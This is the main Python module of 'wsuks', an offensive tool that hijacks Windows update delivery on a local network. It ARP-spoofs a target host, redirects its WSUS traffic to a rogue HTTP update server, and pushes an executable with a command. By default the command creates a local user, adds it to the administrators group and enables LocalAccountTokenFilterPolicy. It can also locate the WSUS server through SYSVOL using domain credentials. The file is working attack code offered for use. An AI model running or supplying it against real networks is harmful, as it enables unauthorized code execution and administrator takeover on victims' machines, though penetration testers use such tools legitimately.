from functools import partial
from http.server import HTTPServer
import logging
import os
from pprint import pformat
import random
from string import digits, ascii_letters
from scapy.all import get_if_addr
import wsuks
from wsuks.helpers.arpspoofer import ArpSpoofer
from wsuks.helpers.logger import initLogger
from wsuks.helpers.argparser import initParser, printBanner
from wsuks.helpers.sysvolparser import SysvolParser
from wsuks.helpers.wsusserver import WSUSUpdateHandler, WSUSBaseServer
from wsuks.helpers.router import Router
from termcolor import colored


class Wsuks:
    def __init__(self, args):
        self.args = args

        self.logger = logging.getLogger("wsuks")
        self.interface = args.interface
        try:
            self.hostIp = get_if_addr(self.interface)
        except ValueError:
            self.logger.error(f"Interface '{args.interface}' not found! Exiting...")
            exit(1)
        self.local_username = "user" + "".join(random.choice(digits) for i in range(5))
        self.local_password = "".join(random.sample(ascii_letters, 16))

        # Set args
        self.targetIp = args.targetIp  # Never None (required)
        self.executable_file = args.executable.read()
        self.executable_name = os.path.basename(args.executable.name)
        args.executable.close()

        # Set Command
        if "CREATE_USER_COMMAND" not in args.command:
            self.command = args.command
        else:
            # Case we add the domain user to the local admin group
            if args.username and args.domain:
                self.logger.success(f"Using domain user for the WSUS attack: User={highlight(args.username, 'green')} Password={highlight(args.password, 'green')} Domain={highlight(args.domain, 'green')}")
                self.command = str(args.command).format(CREATE_USER_COMMAND="", WSUKS_USER=args.domain + "\\" + args.username)
            # Case we generate a local user, add him to the local admin group and make sure LocalAccountTokenFilterPolicy is set to 1
            else:
                with open(os.path.join(os.path.dirname(wsuks.__file__), "executables/Enable-LocalAccountTokenFilterPolicy.ps1")) as file:
                    ps_script = ""
                    for line in file:
                        if line.startswith("#"):
                            continue
                        else:
                            ps_script += line
                self.logger.success(f"Generated local user for the WSUS attack: Username={highlight(self.local_username, 'green')} Password={highlight(self.local_password, 'green')}")
                create_user = f"New-LocalUser -Name {self.local_username} -Password $(ConvertTo-SecureString {self.local_password} -AsPlainText -Force) -Description $(\n{ps_script});\n"
                self.command = str(args.command).format(CREATE_USER_COMMAND=create_user, WSUKS_USER=self.local_username)
        self.logger.success(f"Command to execute: \n{highlight(self.executable_name, 'yellow')} {highlight(self.command, 'yellow')}")

        self.wsusIp = args.wsusIp
        self.wsusPort = args.wsusPort  # Default 8530
        self.domain_username = args.username
        self.domain_password = args.password
        self.domain = args.domain
        self.dcIp = args.dcIp
        self.kerberos = args.kerberos
        self.dcName = args.dcName

    def run(self):
        # Get the WSUS server IP and Port from the sysvol share
        sysvolparser = SysvolParser()
        if not self.wsusIp:
            self.logger.info("WSUS Server not specified, trying to find it in SYSVOL share on DC")
            self.wsusIp, self.wsusPort = sysvolparser.findWsusServer(self.domain, self.domain_username, self.domain_password, self.dcIp, self.kerberos, self.dcName)
        else:
            self.logger.info(f"WSUS Server specified manually: {self.wsusIp}:{self.wsusPort}")

        if self.args.only_discover:
            self.logger.info("Discovered WSUS Server, Exiting...")
            return

        self.logger.info("===== Setup done, starting services =====")
        # Start Arp Spoofing
        arpspoofer = ArpSpoofer(self.interface)
        arpspoofer.start(self.targetIp, self.wsusIp)

        # Set up routing to route spoofed packages to the local HTTP server
        router = Router(self.targetIp, self.hostIp, self.wsusIp, self.wsusPort, self.interface)
        router.start()

        # Prepare WSUS HTTP Server
        update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f"{self.hostIp}:{self.wsusPort}")
        update_handler.set_resources_xml(self.command)

        self.logger.debug(update_handler)

        http_handler = partial(WSUSBaseServer, update_handler)
        http_server = HTTPServer((self.hostIp, self.wsusPort), http_handler)
        try:
            self.logger.info(f"Starting WSUS Server on {self.hostIp}:{self.wsusPort}...")
            http_server.serve_forever()
        except KeyboardInterrupt:
            print()
            self.logger.info("===== Stopping Services =====")
            self.logger.info("Stopping WSUS Server...")
        finally:
            arpspoofer.stop()
            router.stop()


def highlight(text, color):
    return colored(text, color, attrs=["bold"])


def main():
    # Setup
    printBanner()
    args = initParser()

    logger = initLogger(ts=args.timestamp, debug=args.debug)
    logger.debug("Passed args:\n" + pformat(vars(args)))

    # Prevent scapy from logging to console
    logging.getLogger("scapy").disabled = True
    logging.getLogger("scapy.runtime").disabled = True

    if os.geteuid() != 0:
        logger.error("This script must be run as root!")
        exit(1)

    wsuks = Wsuks(args)
    wsuks.run()


if __name__ == "__main__":
    main()
